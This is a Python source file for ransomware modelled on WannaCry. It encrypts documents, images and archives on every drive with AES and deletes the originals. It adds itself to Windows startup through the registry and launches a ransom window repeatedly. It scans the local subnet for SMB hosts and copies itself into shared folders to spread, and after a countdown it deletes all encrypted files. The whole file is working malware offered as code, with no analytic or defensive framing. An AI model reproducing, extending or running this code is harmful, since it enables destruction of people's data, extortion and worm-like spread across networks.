import os
import string
import ctypes
import subprocess
import tempfile
import shutil
import sys
import winreg
import datetime
import secrets
import time
import threading
import ipaddress
import socket
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import padding, hashes

# File extensions to encrypt
TARGET_EXTENSIONS = [
    ".txt", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".pdf", ".jpg", ".png", ".csv", ".zip", ".rar", ".mp3", ".mp4"
]

# Directories to exclude to avoid system errors
EXCLUDE_DIRS = [
    "C:\\Windows", "C:\\Program Files", "C:\\Program Files (x86)", "C:\\ProgramData", "C:\\$Recycle.Bin"
]

# Use a hardcoded encryption key, hash with SHA-256 to get 32 bytes for AES
RAW_KEY_STRING = "TWpJMU1qQTBOekVrTWpJMU1qQTBORFFq"

# Encrypted file extension
ENCRYPTED_EXTENSION = ".mu"  

# Registry path for infection time
INFECTION_TIME_REG_PATH = r"Software\WannaCry"
INFECTION_TIME_REG_NAME = "InfectionTime"
DAYS_TO_DELETE = 7

# --- Persistence ---
def add_to_startup():
    try:
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_SET_VALUE
        )
        winreg.SetValueEx(key, "WannaCryPersistence", 0, winreg.REG_SZ, exe_path)
        winreg.CloseKey(key)
        print("[✓] Added to Windows startup.")
    except Exception as e:
        print(f"[!] Cannot add to startup: {e}")


# --- Delete expired files ---
def infection_time_control(mode="get"):
    """
    mode: "set" to save infection time, "get" to retrieve it.
    """
    try:
        if mode == "set":
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, INFECTION_TIME_REG_PATH)
            try:
                winreg.QueryValueEx(key, INFECTION_TIME_REG_NAME)
            except FileNotFoundError:
                infection_time = str(datetime.datetime.now().timestamp())
                winreg.SetValueEx(key, INFECTION_TIME_REG_NAME, 0, winreg.REG_SZ, infection_time)
            winreg.CloseKey(key)
        elif mode == "get":
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, INFECTION_TIME_REG_PATH)
            value, _ = winreg.QueryValueEx(key, INFECTION_TIME_REG_NAME)
            winreg.CloseKey(key)
            return float(value)
    except Exception:
        return None
    
def check_and_delete_expired_files_loop():
    while True:
        infection_time = infection_time_control("get")
        now = datetime.datetime.now().timestamp()
        if infection_time and (now - infection_time) >= 240: #change to DAYS_TO_DELETE * 86400
            print("[!] 240s passed. Deleting all encrypted files...")
            drives = get_all_drives()
            for drive in drives:
                for dirpath, _, filenames in os.walk(drive):
                    if should_exclude(dirpath):
                        continue
                    for file in filenames:
                        if file.lower().endswith(ENCRYPTED_EXTENSION):
                            full_path = os.path.join(dirpath, file)
                            try:
                                os.remove(full_path)
                                print(f"[!] Deleted: {full_path}")
                            except Exception as e:
                                print(f"[!] Error deleting {full_path}: {e}")
            sys.exit(0)
        time.sleep(30)  # check every 30 seconds
    
# --- Encryption ---
def generate_key_from_raw_string(raw_key: str) -> bytes:
    digest = hashes.Hash(hashes.SHA256(), backend=default_backend())
    digest.update(raw_key.encode())
    return digest.finalize()  # 32-byte key for AES-256

def encrypt_file_inplace(file_path: str, key: bytes):
    iv = secrets.token_bytes(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()

    with open(file_path, 'rb') as f:
        data = f.read()

    padder = padding.PKCS7(128).padder()
    padded_data = padder.update(data) + padder.finalize()

    encrypted = encryptor.update(padded_data) + encryptor.finalize()

    # Rename encrypted file to ENCRYPTED_EXTENSION
    encrypted_file_path = file_path + ENCRYPTED_EXTENSION

    with open(encrypted_file_path, 'wb') as f:
        f.write(iv + encrypted)

    os.remove(file_path)  # Remove original file after encryption

    print(f"[✓] Encrypted & Renamed: {encrypted_file_path}")

def should_exclude(path: str) -> bool:
    normalized_path = os.path.abspath(path).lower()
    for exclude_dir in EXCLUDE_DIRS:
        if normalized_path.startswith(os.path.abspath(exclude_dir).lower()):
            return True
    return False

def encrypt_files_in_directory(root_dir: str, key: bytes):
    for dirpath, _, filenames in os.walk(root_dir):
        if should_exclude(dirpath):
            continue
        for file in filenames:
            if any(file.lower().endswith(ext) for ext in TARGET_EXTENSIONS):
                full_path = os.path.join(dirpath, file)
                try:
                    encrypt_file_inplace(full_path, key)
                except Exception as e:
                    print(f"[!] Error encrypting {full_path}: {e}")

def get_all_drives():
    drives = []
    bitmask = ctypes.cdll.kernel32.GetLogicalDrives()
    for letter in string.ascii_uppercase:
        if bitmask & 1:
            drives.append(f"{letter}:/")
        bitmask >>= 1
    return drives

# --- GUI ---
def extract_and_run_gui():
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
        gui_src = os.path.join(base_path, 'gui.exe')
        temp_dir = tempfile.mkdtemp()
        gui_dst = os.path.join(temp_dir, 'gui.exe')
        shutil.copy2(gui_src, gui_dst)
        while True:
            proc = subprocess.Popen(gui_dst, shell=True)
            while True:
                if proc.poll() is not None:
                    break
                time.sleep(1)
            time.sleep(10)
    except Exception as e:
        print(f"[!] Cannot run gui.exe: {e}")

def extract_embedded_file(filename: str, output_name: str = None):
    try:
        base_path = getattr(sys, '_MEIPASS', os.path.abspath("."))
        src = os.path.join(base_path, filename)
        dst_dir = tempfile.mkdtemp()
        dst = os.path.join(dst_dir, output_name or filename)
        shutil.copy2(src, dst)
        print(f"[✓] Extracted: {dst}")
        return dst  # Return the path of the extracted file
    except Exception as e:
        print(f"[!] Error extracting {filename}: {e}")
        return None

# --- SMB Propagation ---
def get_local_subnet():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ip_parts = local_ip.split('.')
        subnet = '.'.join(ip_parts[:3]) + '.0/24'
        return subnet
    except Exception as e:
        print(f"[!] Could not detect local subnet: {e}")
        return None

def scan_smb_hosts(subnet, timeout=1):
    open_hosts = []
    net = ipaddress.ip_network(subnet, strict=False)
    lock = threading.Lock()

    def check_host(ip):
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(timeout)
        try:
            s.connect((str(ip), 445))
            with lock:
                open_hosts.append(str(ip))
        except Exception:
            pass
        finally:
            s.close()

    threads = []
    for ip in net.hosts():
        t = threading.Thread(target=check_host, args=(ip,))
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    return open_hosts

def try_copy_to_share(target_ip, exe_path, share_name="Users\\Public"):
    """
    Try to copy the executable to a shared folder on the target machine.
    """
    try:
        # UNC path to the shared folder
        unc_path = fr"\\{target_ip}\{share_name}"
        if not os.path.exists(unc_path):
            return False
        dst = os.path.join(unc_path, "wannacry.exe")
        shutil.copy2(exe_path, dst)
        print(f"[+] Copied to {dst}")
        return True
    except Exception as e:
        print(f"[!] Cannot copy to {target_ip}: {e}")
        return False

def propagate_in_lan():
    """
    Scan and propagate to LAN machines with SMB shares.
    """
    subnet = get_local_subnet()
    if not subnet:
        return
    print(f"[*] Scanning LAN for SMB hosts in subnet {subnet} ...")
    smb_hosts = scan_smb_hosts(subnet)
    print(f"[+] Found SMB hosts: {smb_hosts}")

    exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    for ip in smb_hosts:
        if ip == socket.gethostbyname(socket.gethostname()):
            continue  # Skip self
        # Try to copy to common shared folders
        for share in ["Users\\Public", "C$\\Users\\Public"]:
            try_copy_to_share(ip, exe_path, share_name=share)

if __name__ == "__main__":
    # Thread to display gui.exe
    gui_thread = threading.Thread(target=extract_and_run_gui, daemon=True)
    gui_thread.start()

    # Thread to check for file deletion after expiration
    delete_thread = threading.Thread(target=check_and_delete_expired_files_loop, daemon=True)
    delete_thread.start()

    infection_time_control("set")
    add_to_startup()

    propagate_in_lan()

    key = generate_key_from_raw_string(RAW_KEY_STRING)
    print("[*] Starting encryption...")
    drives = get_all_drives()
    for drive in drives:
        print(f"[+] Scanning drive: {drive}")
        encrypt_files_in_directory(drive, key)

    # Keep the program running so background threads can work
    while True:
        time.sleep(60)